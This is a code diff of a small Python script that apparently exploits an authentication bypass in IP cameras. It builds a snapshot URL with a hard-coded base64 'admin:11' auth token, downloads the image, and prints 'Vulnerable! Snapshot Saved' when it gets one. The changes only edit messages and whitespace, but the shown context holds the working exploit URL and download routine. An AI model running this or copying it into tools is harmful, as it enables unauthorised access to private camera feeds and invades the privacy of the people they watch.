@@ -6,6 +6,7 @@ port = input("Enter Port: ")
 final = "http://" + ip + ":" + port + "/onvif-http/snapshot?auth=YWRtaW46MTEK"
 print(final)
 
+
 def download(url, path):
     try:
         response = requests.get(url)
@@ -13,16 +14,17 @@ def download(url, path):
 
         with open(save_path, 'wb') as file:
             file.write(response.content)
-        print("Snapshot Saved")
+        print("Vulnerable! Snapshot Saved")
 
     except requests.exceptions.HTTPError as e:
         if response.status_code == 401:
             print("Camera is not vulnerable! Error 401")
         else:
-            print("HTTP Error: {e}")
+            print("HTTP Error!")
     except requests.exceptions.RequestException as e:
-        print(f"Unknown Error: {e}")
-        
+        print("Unknown Error!")
+
+
 random_numbers = [str(random.randint(0, 9)) for _ in range(7)]
 random_number_str = ''.join(random_numbers)
 
